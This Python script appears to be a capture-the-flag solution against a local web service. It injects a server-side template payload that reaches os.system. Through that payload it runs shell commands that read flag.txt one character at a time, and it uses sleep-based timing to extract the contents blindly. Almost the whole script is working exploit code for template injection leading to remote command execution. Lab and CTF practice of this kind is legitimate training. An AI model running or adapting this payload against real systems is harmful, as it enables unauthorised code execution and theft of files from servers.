import requests
import math

url = "http://localhost:9017/"

all_characters = "ABCDEFGHIJKMLNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ "

flag = ''
for i in range (1, 30):
    for j in all_characters:  
        data = {
            "text": f"${{self.module.cache.util.os.system('if [ `cat flag.txt | cut -c {i}` = {j} ]; then sleep 7; fi')}}", 
            "action": "encrypt",
            "shift": 26
        }
        res = requests.post(url, data)
        res_time = res.elapsed.total_seconds()
        if res_time > 5:
            flag += j
        print(f'Character: {j}, Flag -> {flag}')

print(f'\nResult: {flag}')